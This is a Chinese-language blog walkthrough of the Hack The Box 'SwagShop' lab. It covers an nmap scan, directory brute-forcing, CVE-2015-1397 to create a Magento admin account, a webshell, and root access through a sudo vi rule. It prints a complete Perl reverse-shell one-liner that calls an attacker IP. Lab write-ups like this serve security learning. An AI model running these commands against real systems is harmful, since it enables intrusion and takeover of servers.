@@ -1,0 +1,792 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang>
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="sudoers,magento,privilete_escalate,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="简介：Magento被认为是全球范围内最实用、最完整的电子商务网站架构系统，是国际化电子商务解决方案之一，像Nike、IKEA等品牌的网站即是采用Magento系统.新版本Magento2可以在本站下载使用。它支持多种语言、多个商铺平台统一管理，具有丰富的模块化架构体系以及丰富的拓展功能。它专业的开源性，使其在第三方系统集成方面有着极为良好的表现。 Magento在世界范围内广泛使用, 是在线商城">
+<meta name="keywords" content="sudoers,magento,privilete_escalate">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HTB-linux-SwagShop">
+<meta property="og:url" content="https://exexute.github.io/2019/05/17/HTB-linux-SwagShop/index.html">
+<meta property="og:site_name" content="owefsad 的博客">
+<meta property="og:description" content="简介：Magento被认为是全球范围内最实用、最完整的电子商务网站架构系统，是国际化电子商务解决方案之一，像Nike、IKEA等品牌的网站即是采用Magento系统.新版本Magento2可以在本站下载使用。它支持多种语言、多个商铺平台统一管理，具有丰富的模块化架构体系以及丰富的拓展功能。它专业的开源性，使其在第三方系统集成方面有着极为良好的表现。 Magento在世界范围内广泛使用, 是在线商城">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2022-06-24T14:37:08.024Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="HTB-linux-SwagShop">
+<meta name="twitter:description" content="简介：Magento被认为是全球范围内最实用、最完整的电子商务网站架构系统，是国际化电子商务解决方案之一，像Nike、IKEA等品牌的网站即是采用Magento系统.新版本Magento2可以在本站下载使用。它支持多种语言、多个商铺平台统一管理，具有丰富的模块化架构体系以及丰富的拓展功能。它专业的开源性，使其在第三方系统集成方面有着极为良好的表现。 Magento在世界范围内广泛使用, 是在线商城">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"hide","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://exexute.github.io/2019/05/17/HTB-linux-SwagShop/">
+
+
+
+
+
+  <title>HTB-linux-SwagShop | owefsad 的博客</title>
+  
+
+
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?2a72b138b6ef81ae123fcd18e91fa843";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">owefsad 的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            Categories
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://exexute.github.io/2019/05/17/HTB-linux-SwagShop/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="owefsad">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="owefsad 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">HTB-linux-SwagShop</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-05-17T06:50:51+08:00">
+                2019-05-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>简介：<br>Magento被认为是全球范围内最实用、最完整的电子商务网站架构系统，是国际化电子商务解决方案之一，像Nike、IKEA等品牌的网站即是采用Magento系统.新版本Magento2可以在本站下载使用。它支持多种语言、多个商铺平台统一管理，具有丰富的模块化架构体系以及丰富的拓展功能。它专业的开源性，使其在第三方系统集成方面有着极为良好的表现。</p>
+<p>Magento在世界范围内广泛使用, 是在线商城类CMS的翘楚, 该靶机集成类Magento CMS, 在完成靶机的过程中了解类Magento CMS的一些运行原理、历史CVE问题, 靶机的思路是利用cve获取webshell, 从webshell提升至reverse shell, 提升之后相关flag可附带查出。</p>
+<p>靶机状态: 已完成<br><a id="more"></a></p>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li>端口扫描</li>
+<li>利用cve获取webshell</li>
+<li>从webshell到反弹shell</li>
+</ul>
+<blockquote>
+<p>一、端口扫描</p>
+</blockquote>
+<p>使用nmap扫描开放的端口<code>nmap -sC -sV 10.10.10.140</code>, 开放22和80端口, 系统是ubuntu, WEB中间件是apache 2.4.18、OpenSSH 7.2p2. 两个组件均无RCE漏洞, OpenSSH 7.2p2存在用户名枚举的CVE.<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-17 07:14 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.140</span><br><span class="line">Host is up (0.25s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 b6:55:2b:d2:4e:8f:a3:81:72:61:37:9a:12:f6:24:ec (RSA)</span><br><span class="line">|   256 2e:30:00:7a:92:f0:89:30:59:c1:77:56:ad:51:c0:ba (ECDSA)</span><br><span class="line">|_  256 4c:50:d5:f2:70:c5:fd:c4:b2:f0:bc:42:20:32:64:34 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Home page</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 18.99 seconds</span><br></pre></td></tr></table></figure></p>
+<p>查80端口<br>访问80端口后, 发现是一个<strong>Magento</strong>的CMS站点, 用户界面可自行注册, 存在后台管理接口, 存在若干CVE, 包含XXE、XSS等.</p>
+<blockquote>
+<p>二、利用CVE获取webshell</p>
+</blockquote>
+<h4 id="WEB站点信息收集"><a href="#WEB站点信息收集" class="headerlink" title="WEB站点信息收集"></a>WEB站点信息收集</h4><p>在浏览器中访问Magento站点后, 没有找到敏感信息, 用<code>gobuster -u http://10.10.10.140 -w /usr/share/wordlists/dirbuste/apa -t 100</code>进行目录爆破, 发现了一些有意思的数据<code>/app/etc/local.xml</code>中保存了magento的数据库连接串信息, <code>/index.php/admin</code>是后台管理平台的入口</p>
+<p>拿到数据库的账号密码后, 首先考虑连数据库创建后台管理员账号, 但靶机未对外开放数据库端口, 因此暂无法使用; 然后考虑爆破, 用数据库密码作为root用户的密码和后台管理账号的密码均失败;  因此先搁置数据库账号密码信息, 开始转向CMS的CVE漏洞, 通过exploit-db站点发现了11个CVE, 类型为本地文件读取、远程文件包含、远程代码执行、XXE、XSS, 通过google搜索额外发现若干SQL注入。</p>
+<h4 id="CVE利用"><a href="#CVE利用" class="headerlink" title="CVE利用"></a>CVE利用</h4><p>在运行proof of concept时, 发现Magento的一个小细节: 访问不存在的页面直接爆404, 访问不存在的模块爆自定义页面版404, 访问管理后台中的链接且链接存在时会重定向至管理平台登陆页面。 </p>
+<p>基于这个细节, 发现存在<strong>Cms_Wysiwyg</strong>插件, 其url为<code>/index.php/admin/Cms_Wysiwyg/directive/index/</code>, 修改<code>CVE-2015-1397</code>漏洞的poc中url内容和账号密码, 成功创建管理员账号, 进入管理后台。</p>
+<h4 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h4><p>拿到管理员账号后, 获取WEBSHELL的方法基本上是通过上传<strong>FileSystem</strong>插件, 编辑php文件写入webshel, weevely连接webshell。 连接webshell后, 获得user.txt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">www-data@swagshop:/home/haris $ cat user.txt</span><br><span class="line">a448877277e82f05e5ddf9f90aefbac8</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>三、从webshell到反弹shell</p>
+</blockquote>
+<p>在webshell中运行<code>sudo -l</code>命令发现可免密执行vi命令, 哈哈, root权限触手可得<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">weevely&gt; sudo -l</span><br><span class="line">Matching Defaults entries for www-data on swagshop:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on swagshop:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/vi /var/www/html/*</span><br></pre></td></tr></table></figure></p>
+<p>webshell中无法执行vi这种交互式命令, 因此创建反弹shell执行vi, 但常用的bash、python等命令创建反弹shell一直无法连接过来, 最后用perl获得&gt;了反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">perl -e &apos;use Socket;$i=&quot;10.10.14.244&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&apos;</span><br></pre></td></tr></table></figure></p>
+<p>拿到root权限后, 获得root.txt<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">:!sh</span><br><span class="line">id  file when making changes.  Quit, or <span class="built_in">continue</span> with caution.</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)hed.</span><br><span class="line">cat /root/root.txt <span class="keyword">case</span>, use <span class="string">":recover"</span> or <span class="string">"vim -r /var/www/html/a.txt"</span></span><br><span class="line">c2b087d66e14a652a3b86a130ac56721<span class="string">":help recovery"</span>).</span><br><span class="line">    If you did this already, delete the swap file <span class="string">"/var/www/html/.a.txt.swp"</span></span><br><span class="line">   ___ ___id this message.</span><br><span class="line"> /| |/|\| |\</span><br><span class="line">/_| ´ |.` |_\           We are open! (Almost)exists!</span><br><span class="line">  |   |.  |-Only, (E)dit anyway, (R)ecover, (Q)uit, (A)bort: e</span><br><span class="line">  |   |.  |         Join the beta HTB Swag Store!</span><br><span class="line">  |___|.__|       https://hackthebox.store/password</span><br><span class="line"></span><br><span class="line">                   PS: Use root flag as password!</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>四、障碍点</p>
+</blockquote>
+<ol>
+<li>magento创建admin账号poc中涉及路径查找, 明明已经找到但是一直以为不是</li>
+<li>magento后台如何上传file_system插件</li>
+<li>upgrade webshell to reverse_shell(严格区分两者的区别)</li>
+<li>upgrade reverse_shell to tty(严格区分两者区别)</li>
+<li>sudoers配置利用需加sudo前缀</li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/sudoers/" rel="tag"># sudoers</a>
+          
+            <a href="/tags/magento/" rel="tag"># magento</a>
+          
+            <a href="/tags/privilete-escalate/" rel="tag"># privilete_escalate</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/05/08/HTB-windows-Bastion/" rel="next" title="HTB-windows-Bastion">
+                <i class="fa fa-chevron-left"></i> HTB-windows-Bastion
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/06/10/HTB-linux-FriendZone/" rel="prev" title="HTB-linux-FriendZone">
+                HTB-linux-FriendZone <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#目录"><span class="nav-number">1.</span> <span class="nav-text">目录</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#WEB站点信息收集"><span class="nav-number">1.0.1.</span> <span class="nav-text">WEB站点信息收集</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CVE利用"><span class="nav-number">1.0.2.</span> <span class="nav-text">CVE利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#获取webshell"><span class="nav-number">1.0.3.</span> <span class="nav-text">获取webshell</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
